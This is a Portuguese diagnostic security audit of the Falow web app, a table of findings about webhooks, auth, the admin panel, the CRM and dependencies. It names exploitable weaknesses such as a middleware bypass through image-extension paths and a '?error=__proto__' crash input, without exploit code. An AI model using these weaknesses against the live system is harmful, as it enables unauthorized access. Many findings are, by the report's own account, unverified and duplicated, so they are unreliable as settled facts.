# Auditoria do Falow (29/10/2026)

Diagnóstico apenas, nada foi corrigido. 15 frentes de análise (webhooks Meta e Stripe, auth, admin, server actions, CRM, sequências e crons, banco/RLS, segredos, cliente, dependências, performance, regras/IA, contas do Instagram e checklist oficial da Cloudflare `workers-best-practices`).

Total: 181 achados. 34 passaram por verificação adversarial (3 lentes). Os demais não foram verificados porque o limite de uso esgotou: trate-os como prováveis, não como certos. Há duplicatas entre blocos (ex.: Next.js, headers HTTP e CRON_SECRET aparecem mais de uma vez).

Estado de base: `tsc` limpo, 957 testes passando, `npm audit` com 34 vulnerabilidades (5 críticas, 12 altas), a maior parte só em ferramentas de dev.

| ID | Sev. | Categoria | Título | Arquivo:linha | Status |
|---|---|---|---|---|---|
| A0-001 | high | security | Next.js 14.2.35 está fora da linha de correções de segurança: 25 advisories abertos no npm audit, todos corrigidos só em 15.5.x/16.x | `package.json:37` | ✅ confirmado (3 lentes) |
| A1-001 | high | security | Next.js 14.2.35 fora da linha com correções de segurança (DoS em Server Actions, cache confusion, disclosure de endpoints) | `package.json:37` | ✅ confirmado (3ª verificação) |
| A2-001 | high | security | Next.js 14.2.35 em fim de vida: advisories de 2026 (DoS não autenticado via Server Functions/RSC, exposição de IDs de Server Actions) não têm correção no branch 14 | `package.json:37` | ✅ confirmado (3ª verificação) |
| A2-002 | high | optimization | Webhook da Meta responde 200 só depois de todo o processamento (sleeps de 2–5s por regra, pausas humanizadas e atrasos inline de até 20s) | `src/app/api/webhooks/meta/route.ts:45` | ✅ confirmado (3ª verificação) |
| A0-009 | medium | bug | Cliente bloqueado consegue pagar pela landing e continua sem acesso | `src/app/api/billing/checkout/route.ts:33` | ✅ confirmado (3 lentes) |
| A0-012 | medium | webhook | Tempo de execução do webhook: sleeps, delays inline e tick oportunista rodam dentro do request antes do 200 | `src/app/api/webhooks/meta/route.ts:45` | ✅ confirmado (3 lentes) |
| A0-004 | medium | security | Login, 'esqueci minha senha' e 'definir senha' sem rate limit no app; o Supabase só vê o IP de saída da Cloudflare | `src/app/login/actions.ts:28` | ✅ confirmado (3 lentes) |
| A0-007 | medium | security | requireAdmin aceita sessão sem MFA (AAL1): senha vazada de um admin dá o painel inteiro | `src/lib/admin/require-admin.ts:18` | ✅ confirmado (3 lentes) |
| A0-010 | medium | bug | Corrida entre entregas paralelas: a mesma regra pode responder 2x para a mesma pessoa | `src/lib/meta/process.ts:455` | ✅ confirmado (3 lentes) |
| A0-011 | medium | reliability | Dedupe gravado antes do processamento + 200 incondicional: falha transitória perde o evento para sempre | `src/lib/meta/process.ts:235` | ✅ confirmado (3 lentes) |
| A0-014 | medium | optimization | Chamadas síncronas à Graph API da Meta em toda renderização de página (perfil e mídia), sem cache | `src/lib/rules/account-media.ts:42` | ✅ confirmado (3 lentes) |
| A0-002 | medium | security | Matcher do middleware ignora caminhos terminados em extensão de imagem: usuário bloqueado ou sem assinatura invoca server actions do painel e abre o shell por /rules/sequencias/x.png | `src/middleware.ts:69` | ✅ confirmado (3 lentes) |
| A3-005 | medium | config | URL dos webhooks e NEXT_PUBLIC_APP_URL documentados sem /sistema: webhook cai na landing e o cron interno responde 404 | `README.md:52` | ✅ confirmado (3ª verificação) |
| A1-002 | medium | config | Nenhum header de segurança HTTP (CSP, HSTS, X-Frame-Options, Referrer-Policy, nosniff, Permissions-Policy) | `next.config.mjs:2` | ✅ confirmado (3ª verificação) |
| A2-003 | medium | security | Nenhum header de segurança HTTP (CSP, X-Frame-Options/frame-ancestors, HSTS, nosniff, Referrer-Policy, Permissions-Policy) é emitido pelo app | `next.config.mjs:2` | ✅ confirmado (3ª verificação) |
| A2-009 | medium | config | serverActions.bodySizeLimit de 26 MB é global e amplifica as advisories de DoS por deserialização do Next 14, inclusive em páginas públicas | `next.config.mjs:9` | ✅ confirmado (3ª verificação) |
| A3-009 | medium | security | Nenhum header de segurança HTTP (HSTS, X-Frame-Options/frame-ancestors, CSP, nosniff) no app ou na borda | `next.config.mjs:2` | ✅ confirmado (3ª verificação) |
| A2-004 | medium | config | Build do OpenNext embute TODOS os valores de .env* no bundle do Worker; nenhuma trava técnica, só o runbook | `package.json:12` | ✅ confirmado (2ª verificação, sev. média) |
| A2-008 | medium | security | @opennextjs/cloudflare 1.14.10 traz o handler /cdn-cgi/image/ com SSRF (GHSA-c7mq-gh6q-6q7c, corrigido em 1.17.1) | `package.json:50` | ✅ confirmado (3ª verificação) |
| A2-017 | medium | bug | Página de Automações carrega todas as interactions 'replied' para contar execuções por regra (sem limite; silenciosamente truncado em 1000 linhas) | `src/app/(dashboard)/rules/(com-abas)/page.tsx:46` | ✅ confirmado (2ª verificação, sev. média) |
| A2-018 | medium | optimization | Editor de workflow (nova/editar) consulta a Graph API da Meta a cada render e envia todos os grafos e 30 versões completas para o cliente | `src/app/(dashboard)/rules/sequencias/[id]/page.tsx:63` | ✅ confirmado (3ª verificação) |
| A3-002 | medium | bug | Linha 'active' de cliente sem acesso impede o novo dono do @ de conectar (account_taken por até 30 dias ou para sempre) | `src/app/api/auth/meta/callback/route.ts:76` | ✅ confirmado (2ª verificação, sev. média) |
| A3-003 | medium | webhook | Falha ao inscrever a conta no webhook é engolida: conta salva como 'active' e usuário vê 'automações já estão valendo' | `src/app/api/auth/meta/callback/route.ts:85` | ✅ confirmado (2ª verificação, sev. média) |
| A3-010 | medium | config | Faltam proteções de borda recomendadas (WAF managed rules, rate limiting, Turnstile) para login, checkout, definir-senha e webhooks | `src/app/api/billing/checkout/route.ts:36` | ✅ confirmado (3ª verificação) |
| A2-005 | medium | webhook | CRON_SECRET aceito na query string (?secret=) e comparado sem tempo constante | `src/app/api/cron/sequences/route.ts:29` | ✅ confirmado (3ª verificação) |
| A3-007 | medium | security | Rota /api/cron/sequences aceita o CRON_SECRET na query string e fica exposta na internet | `src/app/api/cron/sequences/route.ts:30` | ✅ confirmado (3ª verificação) |
| A3-006 | medium | security | Webhooks da Meta e da Stripe bufferizam o corpo inteiro sem limite antes de validar a assinatura | `src/app/api/webhooks/meta/route.ts:29` | ✅ confirmado (2ª verificação, sev. baixa) |
| A2-007 | medium | reliability | Rotação/perda da TOKEN_ENCRYPTION_KEY deixa contas 'active' quebradas em silêncio; formato sem versão de chave | `src/lib/crypto.ts:32` | ✅ confirmado (2ª verificação, sev. baixa) |
| A3-001 | medium | security | Portão de seguidor libera o conteúdo quando a consulta à Graph API falha (fail-open) | `src/lib/follow-gate/check.ts:36` | ✅ confirmado (2ª verificação, sev. baixa) |
| A2-011 | medium | optimization | Eventos de um mesmo lote do webhook são processados estritamente em série | `src/lib/meta/process.ts:167` | ✅ confirmado (3ª verificação) |
| A2-012 | medium | optimization | Uma única DM recebida gera ~25–30 round trips sequenciais ao Supabase (a mesma linha de conversations é lida/escrita 7+ vezes) | `src/lib/meta/process.ts:249` | ✅ confirmado (3ª verificação) |
| A3-008 | medium | reliability | Trabalho longo (pausas de 2-5 s, typing, atrasos inline até 20 s) dentro do fetch do webhook; retry da Meta + dedup por mid perde a mensagem | `src/lib/meta/process.ts:470` | ✅ confirmado (3ª verificação) |
| A3-011 | medium | optimization | Cerca de 35 chamadas PostgREST sequenciais (mais 4 escritas de expiração) por DM recebida; latência regional acumulada | `src/lib/meta/process.ts:186` | ✅ confirmado (3ª verificação) |
| A2-013 | medium | optimization | findServedAccount repete 3 consultas (ig_accounts, access_grants, subscriptions) para cada evento do mesmo lote e por chamada | `src/lib/meta/served-account.ts:14` | ✅ confirmado (3ª verificação) |
| A1-005 | medium | reliability | Tick das sequências é serial e com pausa humanizada obrigatória: teto real de ~6–10 retomadas por minuto, backlog acumula e vira window_expired | `src/lib/sequences/runtime.ts:625` | ✅ confirmado (2ª verificação, sev. média) |
| A1-006 | medium | reliability | Tick oportunista + sleeps inline seguram a resposta 200 do webhook da Meta por dezenas de segundos; invocação cancelada deixa runs presos em running | `src/lib/sequences/runtime.ts:821` | ✅ confirmado parcial (2ª verificação, sev. média) |
| A1-007 | medium | reliability | Erro transitório da Graph API (timeout, 5xx, rate limit) encerra o run como `error` para sempre, sem retry, e a pessoa fica travada pelo unique | `src/lib/sequences/runtime.ts:1239` | ✅ confirmado (2ª verificação, sev. média) |
| A2-014 | medium | optimization | maybeStartSequence carrega todos os workflows ativos com o grafo inteiro (select *) a cada DM | `src/lib/sequences/runtime.ts:166` | ✅ confirmado (3ª verificação) |
| A2-015 | medium | optimization | recoverStaleRuns varre sequence_runs sem índice a cada webhook e a cada minuto no cron | `src/lib/sequences/runtime.ts:778` | ✅ confirmado (3ª verificação) |
| A3-004 | medium | reliability | CRM continua gravando mensagens e usando o token de cliente sem acesso (cancelado, bloqueado ou cortesia vencida) | `src/modules/crm/capture/server/capture-event.ts:34` | ✅ confirmado (3ª verificação) |
| A1-004 | medium | security | CRM grava mensagens, inscreve no funil e consulta a Graph API para contas de usuário bloqueado/sem assinatura | `src/modules/crm/capture/server/record.ts:22` | ✅ confirmado (3ª verificação) |
| A2-010 | medium | optimization | Realtime do Inbox e do Funil: inscrição sem filtro em tabelas inteiras e cada evento refaz a página inteira no servidor | `src/modules/crm/inbox/hooks/use-inbox-realtime.ts:40` | ✅ confirmado (2ª verificação, sev. média) |
| A1-003 | medium | security | Server actions do CRM não checam acesso (bloqueio/assinatura): a trava fica só no middleware, que ignora rotas públicas | `src/modules/crm/inbox/services/composer.actions.ts:82` | ✅ confirmado (2ª verificação, sev. média) |
| A2-016 | medium | optimization | Entrada automática no funil faz 3 consultas por DM para descobrir que o lead já existe, e moveLead faz mais 4 antes de inserir | `src/modules/crm/pipeline/server/enroll-lead.ts:21` | ✅ confirmado (3ª verificação) |
| A3-013 | medium | optimization | 'Trazer conversas existentes' carrega todas as conversas da conta (teto de 1000) e chama moveLead uma a uma (~6 consultas por conversa) dentro de uma server action | `src/modules/crm/pipeline/server/enroll-lead.ts:61` | ✅ confirmado (2ª verificação, sev. média) |
| A3-012 | medium | bug | getBoard carrega stage_id+value de TODOS os leads do funil para contar/somar em JS (truncado em 1000) e faz 1 consulta por etapa | `src/modules/crm/pipeline/services/pipeline.queries.ts:112` | ✅ confirmado (2ª verificação, sev. média) |
| A2-019 | medium | optimization | Filtro por tag no Inbox varre todos os contatos com tag em páginas de 1000 e filtra em JS, ignorando o índice GIN existente | `src/modules/crm/tags/server/tagged-contacts.ts:31` | ✅ confirmado, só otimização (2ª verificação, sev. baixa) |
| A1-009 | medium | optimization | sequence_runs sem índice para as consultas de recoverStaleRuns (status='running') e da ficha do Inbox: seq scan a cada minuto e em cada webhook | `supabase/migrations/0001_init.sql:149` | ✅ confirmado (2ª verificação, sev. baixa) |
| A1-008 | medium | config | Aplicação da migration 0022 (ig_accounts somente leitura) não é verificada por nenhuma checagem automática; sem ela, qualquer usuário logado escreve token/status/ig_user_id direto pela API | `supabase/migrations/0022_ig_accounts_select_only.sql:18` | ✅ confirmado parcial (2ª verificação, sev. média) |
| A2-006 | medium | config | Workers Logs (invocation logs) gravam URLs com token_hash de convite/recuperação de senha e code do OAuth | `wrangler.toml:33` | ✅ incerto (2ª verificação, sev. baixa) |
| A0-025 | low | config | NEXT_PUBLIC_APP_URL e URL do webhook da Stripe documentadas sem o /sistema no README e no .env.example, mas o código exige o /sistema (quebra pós-compra, convite, OAuth e crons) | `.env.example:32` | ✅ confirmado (3 lentes) |
| A0-005 | low | security | Nenhum cabeçalho de segurança (CSP, frame-ancestors, HSTS, nosniff, Referrer-Policy) e cookie de sessão legível por JavaScript | `next.config.mjs:2` | ✅ confirmado (3 lentes) |
| A0-030 | low | security | bodySizeLimit de 26 MB vale para todas as server actions, inclusive as anônimas do login | `next.config.mjs:9` | ✅ confirmado (3 lentes) |
| A0-003 | low | security | @opennextjs/cloudflare 1.14.10 tem dois advisories high (SSRF via /cdn-cgi/image e bypass do middleware por caminhos codificados) | `package.json:50` | ✅ confirmado (3 lentes) |
| A0-006 | low | security | Registro de auditoria (admin_audit_log) não é imutável: o próprio código faz UPDATE e nada no banco impede UPDATE/DELETE | `src/app/admin/actions.ts:124` | ✅ confirmado (3 lentes) |
| A0-013 | low | optimization | Página Registro faz até ~51 chamadas HTTP ao GoTrue por render (N+1 em getUserById) | `src/app/admin/page.tsx:63` | ✅ confirmado (3 lentes) |
| A0-020 | low | security | POST /api/billing/checkout sem autenticação nem limite cria sessões de Checkout ilimitadas na Stripe | `src/app/api/billing/checkout/route.ts:36` | ✅ confirmado (3 lentes) |
| A0-024 | low | config | Rota de purge exposta na internet com comparação de segredo não constante | `src/app/api/cron/purge/route.ts:14` | ✅ confirmado (3 lentes) |
| A0-031 | low | config | CRON_SECRET aceito na query string de /api/cron/sequences com Workers Logs ligado | `src/app/api/cron/sequences/route.ts:29` | ✅ confirmado (3 lentes) |
| A0-018 | low | config | GET de verificação aceita qualquer requisição se META_VERIFY_TOKEN estiver vazio | `src/app/api/webhooks/meta/route.ts:19` | ✅ confirmado (3 lentes) |
| A0-019 | low | webhook | Idempotência do webhook da Stripe não cobre entregas simultâneas: stripe_events só é gravado após processar e a leitura de dedup ignora erro | `src/app/api/webhooks/stripe/route.ts:39` | ✅ confirmado (3 lentes) |
| A0-026 | low | bug | Página /assinatura/obrigado promete e-mail que não é enviado quando o e-mail da compra já tem conta | `src/app/assinatura/obrigado/page.tsx:14` | ✅ confirmado (3 lentes) |
| A0-034 | low | bug | Corrida entre admins em writeWithAudit: cortesia pode sobrescrever um bloqueio recém-aplicado (guard lido de estado velho) | `src/lib/admin/grants.ts:66` | ✅ confirmado (3 lentes) |
| A0-023 | low | reliability | Acesso não tem teto pelo `current_period_end`: se o webhook parar, assinaturas canceladas mantêm acesso indefinidamente | `src/lib/billing/access.ts:112` | ✅ confirmado (3 lentes) |
| A0-032 | low | bug | FALOW_OWNER_USER_ID comparado de forma case-sensitive (isOwner e adminIds sem normalizar): dono em maiúsculas deixa de ser dono/admin e perde a proteção contra bloqueio | `src/lib/billing/access.ts:21` | ✅ confirmado (3 lentes) |
| A0-022 | low | bug | Reativação com assinatura `incomplete` abre segunda assinatura no mesmo customer (cobrança em dobro silenciosa) | `src/lib/billing/checkout.ts:13` | ✅ confirmado (3 lentes) |
| A0-008 | low | security | Vínculo de assinatura por e-mail não verificado: terceiro pode ligar um cliente Stripe a qualquer conta existente sem acesso | `src/lib/billing/stripe-events.ts:167` | ✅ confirmado (3 lentes) |
| A0-021 | low | webhook | Assinatura criada fora do Checkout (dashboard da Stripe) nunca entra: created/updated de id diferente é ignorado e de cliente desconhecido dá 500 por 3 dias | `src/lib/billing/stripe-events.ts:219` | ✅ confirmado (3 lentes) |
| A0-016 | low | optimization | Tabela processed_events cresce sem limite (nenhum purge) e recebe mids de contas desconhecidas | `src/lib/meta/process.ts:234` | ✅ confirmado (3 lentes) |
| A0-017 | low | optimization | Consultas repetidas por evento: ~10-12 round trips ao Supabase antes de qualquer resposta | `src/lib/meta/process.ts:243` | ✅ confirmado (3 lentes) |
| A0-027 | low | security | Cookies de sessão sem flag Secure e com path '/', fora do basePath /sistema (vazam para a landing no mesmo hostname) | `src/lib/supabase/server.ts:10` | ✅ confirmado (3 lentes) |
| A0-028 | low | bug | Redirect e rewrite do middleware descartam os cookies renovados pelo getUser() | `src/middleware.ts:53` | ✅ confirmado (3 lentes) |
| A0-029 | low | optimization | Middleware faz três chamadas de rede sequenciais ao Supabase em toda requisição (inclusive prefetch RSC e POST de actions) e o layout repete a primeira | `src/middleware.ts:43` | ✅ confirmado (3 lentes) |
| A0-015 | low | security | CRM captura mensagens e usa o token da conta para contas sem assinatura ou bloqueadas | `src/modules/crm/capture/server/record.ts:22` | ✅ confirmado (3 lentes) |
| A0-033 | low | security | Policy de SELECT em access_grants expõe ao cliente o motivo interno do bloqueio e o UUID do admin | `supabase/migrations/0021_admin_access_grants.sql:24` | ✅ confirmado (3 lentes) |
| A2-023 | low | security | /_next/image funciona como proxy aberto para cdninstagram/fbcdn/graph.facebook.com embora o app não use next/image | `next.config.mjs:11` | ✅ confirmado (3ª verificação) |
| A3-037 | low | security | /_next/image funciona como proxy anônimo para hosts do Instagram sem o binding IMAGES | `next.config.mjs:12` | ✅ confirmado (3ª verificação) |
| A2-037 | low | config | Higiene de supply chain: sem CI com npm ci/audit, sem engines/.nvmrc, caret em tudo, @types/node 20 com Node 22, @supabase/ssr seis minors atrás e compatibility_date mais nova que o workerd instalado | `package.json:51` | ✅ confirmado parcial (3ª verificação) |
| A3-033 | low | config | @opennextjs/cloudflare 1.14.10 vulnerável (GHSA-c7mq-gh6q-6q7c SSRF via /cdn-cgi, corrigido em 1.17.1; GHSA-2vc4-c4r6-p6v6, corrigido em 1.20.2) | `package.json:47` | ✅ confirmado parcial (3ª verificação) |
| A3-034 | low | config | Zod 3.25.76 abaixo da recomendação (>= 4.5) e dentro do range da advisory GHSA-mrhx-c7xc-m3w5 (<4.6.6, exaustão de memória) | `package.json:51` | ✅ confirmado parcial (3ª verificação) |
| A1-044 | low | config | check-tenant-isolation.mjs não testa escrita cruzada: só cobre leitura de B e insert/update em ig_accounts | `scripts/check-tenant-isolation.mjs:104` | ✅ confirmado (3ª verificação) |
| A1-014 | low | reliability | Desconectar conta não revoga o token na Meta nem cancela a assinatura de webhook | `src/app/(dashboard)/accounts/actions.ts:26` | ✅ confirmado (3ª verificação) |
| A3-028 | low | webhook | Desconectar/expirar não revoga o token na Meta nem desfaz a inscrição no webhook; a Meta continua mandando eventos do @ | `src/app/(dashboard)/accounts/actions.ts:28` | ✅ confirmado (3ª verificação) |
| A3-030 | low | optimization | Toda renderização das páginas de contas/workflows faz 1 chamada à Graph API por conta ativa (sincronização de perfil) | `src/app/(dashboard)/accounts/page.tsx:45` | ✅ confirmado (3ª verificação) |
| A3-032 | low | bug | `?error=__proto__` derruba a página /accounts (lookup em objeto sem proteção de protótipo) | `src/app/(dashboard)/accounts/page.tsx:83` | ✅ confirmado (3ª verificação) |
| A2-032 | low | optimization | Página Contatos envia até 2000 contatos com todos os campos ao navegador para buscar/exportar no cliente | `src/app/(dashboard)/contatos/page.tsx:15` | ✅ confirmado (3ª verificação) |
| A2-033 | low | optimization | Dashboard carrega até 5000 interações para a série de 14 dias e faz formatação de data em loop O(n×14) a cada render | `src/app/(dashboard)/dashboard/page.tsx:115` | ✅ confirmado (3ª verificação) |
| A3-021 | low | optimization | Cada navegação do painel repete 3 getUser() ao Supabase Auth, a checagem de acesso, a leitura/decifração da chave de IA e a listagem de até 200 presets | `src/app/(dashboard)/layout.tsx:16` | ✅ confirmado parcial (3ª verificação) |
| A0-040 | low | bug | saveRule reporta sucesso ao 'editar' uma automação que não existe ou não é do usuário; outras actions de escrita também não conferem linha afetada | `src/app/(dashboard)/rules/actions.ts:300` | ✅ confirmado (3ª verificação) |
| A1-012 | low | security | media_refs aceita strings sem limite e sem validação de URL (até 30 itens por regra) | `src/app/(dashboard)/rules/actions.ts:36` | ✅ confirmado parcial (3ª verificação) |
| A1-013 | low | bug | Botões de link da automação aceitam esquemas não-http (javascript:, data:, ftp:) enquanto o workflow exige http(s) | `src/app/(dashboard)/rules/actions.ts:33` | ✅ confirmado (3ª verificação) |
| A3-014 | low | bug | Palavra-chave que vira zero termos passa na validação e a automação nunca dispara | `src/app/(dashboard)/rules/actions.ts:230` | ✅ confirmado (3ª verificação) |
| A3-015 | low | security | URL de botão e de imagem aceitam qualquer esquema (javascript:, data:, ftp:) no servidor | `src/app/(dashboard)/rules/actions.ts:33` | ✅ confirmado (3ª verificação) |
| A1-011 | low | bug | generateForField não valida `field` (crash) nem limita tamanho de instruction/context | `src/app/(dashboard)/rules/ai-actions.ts:27` | ✅ confirmado (3ª verificação) |
| A3-016 | low | security | generateForField não valida field, count nem tamanho de instruction/context (custo e prompt quebrado) | `src/app/(dashboard)/rules/ai-actions.ts:27` | ✅ confirmado (3ª verificação) |
| A3-017 | low | security | Actions de IA e presets não conferem acesso (bloqueio/assinatura); dependem só do middleware | `src/app/(dashboard)/rules/ai-actions.ts:33` | ✅ confirmado parcial (3ª verificação) |
| A1-010 | low | security | moveToFolder aceita folder_id de qualquer tenant e não valida os ids | `src/app/(dashboard)/rules/folders-actions.ts:99` | ✅ confirmado (3ª verificação) |
| A1-015 | low | optimization | saveSequence faz até 10 round-trips sequenciais ao Supabase (histórico de versões + checagens de conflito carregando todos os grafos) | `src/app/(dashboard)/rules/sequencias/actions.ts:369` | ✅ confirmado (3ª verificação) |
| A2-027 | low | security | zod 3.x (GHSA-mrhx-c7xc-m3w5): z.array().max() não interrompe a validação, e o limite de corpo de 26 MB deixa um usuário logado forçar validação de centenas de milhares de itens | `src/app/(dashboard)/rules/sequencias/actions.ts:167` | ✅ confirmado parcial (3ª verificação) |
| A0-037 | low | security | Convite com cortesia sem limite de taxa nem confirmação: admin comprometido pode disparar convites em massa para e-mails arbitrários | `src/app/admin/actions.ts:115` | ✅ confirmado (3ª verificação) |
| A0-038 | low | security | E-mail do convidado fica para sempre em admin_audit_log.details, mesmo depois do purge LGPD apagar o usuário | `src/app/admin/actions.ts:108` | ✅ confirmado (3ª verificação) |
| A0-035 | low | optimization | Três round-trips ao GoTrue por navegação no /admin (middleware + layout + page chamam getUser) | `src/app/admin/layout.tsx:15` | ✅ confirmado (3ª verificação) |
| A2-034 | low | optimization | Registro do /admin faz uma chamada à Admin API do Supabase Auth por id de usuário a cada render | `src/app/admin/page.tsx:57` | ✅ confirmado parcial (3ª verificação) |
| A3-031 | low | security | State do OAuth não é amarrado ao usuário logado: a conta é gravada para quem estiver logado no momento do callback | `src/app/api/auth/meta/route.ts:25` | ✅ confirmado (3ª verificação) |
| A2-028 | low | security | Rotas POST /api/billing/checkout e /api/billing/portal não verificam Origin/CSRF e o checkout é criado para visitante anônimo sem limite | `src/app/api/billing/checkout/route.ts:12` | ✅ confirmado (3ª verificação) |
| A3-036 | low | security | Comparações de segredo não constantes no cron e na verificação do webhook da Meta; verify.ts faz short-circuit por tamanho | `src/app/api/cron/purge/route.ts:14` | ✅ confirmado (3ª verificação) |
| A1-033 | low | security | CRON_SECRET aceito na query string (vai para logs/URL) e comparado sem tempo constante; rota de cron exposta publicamente sem necessidade | `src/app/api/cron/sequences/route.ts:29` | ✅ confirmado parcial (3ª verificação) |
| A2-026 | low | webhook | Webhook da Meta lê o corpo inteiro antes de validar a assinatura, sem teto de tamanho | `src/app/api/webhooks/meta/route.ts:29` | ✅ confirmado (3ª verificação) |
| A2-036 | low | config | Login, redefinição de senha e checkout anônimo sem rate limiting na aplicação | `src/app/login/actions.ts:37` | ✅ confirmado (3ª verificação) |
| A0-036 | low | reliability | Bloquear não cancela nem pausa a assinatura na Stripe: cliente bloqueado continua sendo cobrado | `src/components/admin/customer-actions.tsx:181` | ✅ confirmado (3ª verificação) |
| A0-039 | low | reliability | Trava de auditoria das server actions depende da string literal 'createAdminClient' e de 'export async function': escapa por indireção | `src/lib/auth/__tests__/admin-actions.audit.test.ts:74` | ✅ confirmado (3ª verificação) |
| A3-029 | low | reliability | Purge só alcança assinaturas 'canceled': tokens e dados de clientes bloqueados, com cortesia vencida ou sem assinatura ficam para sempre | `src/lib/billing/purge.ts:27` | ✅ confirmado (3ª verificação) |
| A1-038 | low | config | URL do cron depende de NEXT_PUBLIC_APP_URL conter '/sistema'; README documenta o valor sem o basePath (cron vira 404 silencioso) | `src/lib/cron/schedule.ts:26` | ✅ confirmado parcial (3ª verificação) |
| A2-020 | low | security | AES-256-GCM sem AAD e com a mesma chave para tokens do Instagram e chaves de IA: cifrados são intercambiáveis entre linhas e tabelas | `src/lib/crypto.ts:22` | ✅ confirmado (3ª verificação) |
| A3-019 | low | optimization | Recheck de 3 s do portão roda inline no webhook, inclusive quando a pessoa só repetiu a palavra-chave | `src/lib/follow-gate/check.ts:32` | ✅ confirmado parcial (3ª verificação) |
| A3-018 | low | optimization | Cada envio do portão faz uma chamada extra à Graph API (syncAccountProfile) dentro do webhook | `src/lib/follow-gate/gate.ts:92` | ✅ confirmado (3ª verificação) |
| A2-025 | low | optimization | withSyncedProfiles faz 1 requisição à Graph API por conta ativa a cada render de /accounts e do editor de workflow, sem cache | `src/lib/meta/account-profile.ts:57` | ✅ confirmado (3ª verificação) |
| A3-026 | low | bug | Limite de 1 conta por cliente só é checado em memória: dois callbacks simultâneos conectam duas contas | `src/lib/meta/connect-guard.ts:17` | ✅ confirmado (3ª verificação) |
| A2-021 | low | security | Tokens de acesso vão na query string das chamadas à Graph API (em vez de Authorization: Bearer); sem appsecret_proof | `src/lib/meta/graph.ts:48` | ✅ confirmado parcial (3ª verificação) |
| A2-038 | low | optimization | Tick oportunista + sweep de expiração executam 6 consultas extras ao fim de todo webhook, mesmo sem nada a fazer | `src/lib/meta/process.ts:186` | ✅ confirmado (3ª verificação) |
| A2-022 | low | reliability | Renovação de token: expires_in ausente desliga a renovação para sempre; falha de renovação é retentada a cada evento; sem backoff/retry na Graph API | `src/lib/meta/token.ts:37` | ✅ confirmado parcial (3ª verificação) |
| A3-027 | low | reliability | Renovação do token: nunca roda com token_expires_at nulo, repete a cada envio quando falha, ignora erro do update e não tem trava contra corrida | `src/lib/meta/token.ts:37` | ✅ confirmado parcial (3ª verificação) |
| A3-020 | low | optimization | Seletor de publicações busca a mídia de todas as contas ativas a cada render, sem cache | `src/lib/rules/account-media.ts:42` | ✅ confirmado (3ª verificação) |
| A1-037 | low | bug | Validação limita cada atraso a 23h, mas não a soma dos atrasos no caminho: fluxo válido no editor termina em window_expired | `src/lib/sequences/graph.ts:377` | ✅ confirmado (3ª verificação) |
| A1-034 | low | bug | Retomadas por resposta/botão ganham um orçamento novo de 40s por evento (deadline não é propagado), contrariando o controle de tempo único da invocação | `src/lib/sequences/runtime.ts:390` | ✅ confirmado (3ª verificação) |
| A1-035 | low | bug | Falha de leitura no banco é confundida com 'Sequência removida' / 'Conta desconectada' e encerra o run definitivamente; persistRun ignora erro de escrita | `src/lib/sequences/runtime.ts:571` | ✅ confirmado (3ª verificação) |
| A1-036 | low | bug | 'Ir para workflow': erro no destino antes da 1ª mensagem some do painel de execuções (run atual vira completed, run do destino é apagado) | `src/lib/sequences/runtime.ts:1158` | ✅ confirmado (3ª verificação) |
| A1-039 | low | optimization | Sweep de expiração + recoverStaleRuns + select de vencidos rodam em TODO webhook e o tick faz 6 round-trips por run antes de executar | `src/lib/sequences/runtime.ts:631` | ✅ confirmado parcial (3ª verificação) |
| A2-024 | low | security | Verificação da chave de IA envia a chave ao provedor que o usuário selecionou, mesmo quando o prefixo mostra que é de outro | `src/modules/ai-settings/services/verify-key.ts:38` | ✅ confirmado (3ª verificação) |
| A1-023 | low | bug | Importação de histórico reabre conversas concluídas e gasta ~4 queries por mensagem importada | `src/modules/crm/capture/server/record.ts:124` | ✅ confirmado (3ª verificação) |
| A2-039 | low | optimization | ensureConversation faz UPSERT com DO UPDATE em toda mensagem, disparando evento realtime de UPDATE em conversations sem mudança real | `src/modules/crm/capture/server/record.ts:68` | ✅ confirmado parcial (3ª verificação) |
| A3-023 | low | optimization | Importação de histórico grava mensagem a mensagem (4 round trips cada) e repete ensureConversation para a mesma conversa | `src/modules/crm/history-import/server/import-history.ts:70` | ✅ confirmado (3ª verificação) |
| A1-029 | low | reliability | Importação de histórico sem controle de ritmo e com backfill de até 200 chamadas à Graph API numa única action | `src/modules/crm/history-import/services/history-import.actions.ts:55` | ✅ confirmado parcial (3ª verificação) |
| A2-035 | low | optimization | Falha da foto do lead dispara uma server action por avatar renderizado, sem agrupamento | `src/modules/crm/inbox/components/lead-avatar.tsx:62` | ✅ confirmado parcial (3ª verificação) |
| A1-017 | low | security | URLs de anexos/mídia renderizadas sem validar esquema (javascript:) nem host | `src/modules/crm/inbox/components/message-bubble.tsx:360` | ✅ confirmado parcial (3ª verificação) |
| A2-029 | low | security | URLs de anexo e mídia vindas do payload da Meta são renderizadas em href/src sem validar o protocolo | `src/modules/crm/inbox/components/message-bubble.tsx:361` | ✅ confirmado parcial (3ª verificação) |
| A1-024 | low | optimization | Realtime postgres_changes sem filtro em messages, conversations e leads: cada mudança de qualquer tenant é avaliada contra o RLS de cada painel aberto, e cada evento faz router.refresh | `src/modules/crm/inbox/hooks/use-inbox-realtime.ts:40` | ✅ confirmado parcial (3ª verificação) |
| A1-016 | low | security | sendMessage aceita attachmentUrl e attachmentKind arbitrários vindos do cliente | `src/modules/crm/inbox/services/composer.actions.ts:116` | ✅ confirmado (2ª verificação, sev. baixa) |
| A1-018 | low | security | Bucket crm-uploads público e permanente: arquivo acessível por URL para sempre, sem expiração, sem limites por bucket, sem limpeza de anexos não enviados e sem checagem do conteúdo | `src/modules/crm/inbox/services/composer.actions.ts:157` | ✅ confirmado parcial (2ª verificação, sev. baixa) |
| A1-031 | low | reliability | Upload de anexo bufferiza até 26 MB em memória no Worker | `src/modules/crm/inbox/services/composer.actions.ts:158` | ✅ confirmado (3ª verificação) |
| A2-031 | low | security | URL de anexo enviada pelo composer é aceita de qualquer origem (não é restrita ao bucket crm-uploads) | `src/modules/crm/inbox/services/composer.actions.ts:116` | ✅ confirmado (3ª verificação) |
| A1-027 | low | optimization | getUnreadTotal lê todas as conversas com não lidas em todo render do layout | `src/modules/crm/inbox/services/inbox.queries.ts:193` | ✅ confirmado (3ª verificação) |
| A1-030 | low | bug | Busca livre do Inbox: curinga '_' não escapado e aspas quebram o filtro `or` do PostgREST | `src/modules/crm/inbox/services/inbox.queries.ts:44` | ✅ confirmado (3ª verificação) |
| A2-040 | low | optimization | getUnreadTotal soma unread_count em JS lendo todas as conversas não lidas a cada navegação do painel (limitado a 1000 linhas pelo PostgREST) | `src/modules/crm/inbox/services/inbox.queries.ts:193` | ✅ confirmado parcial (3ª verificação) |
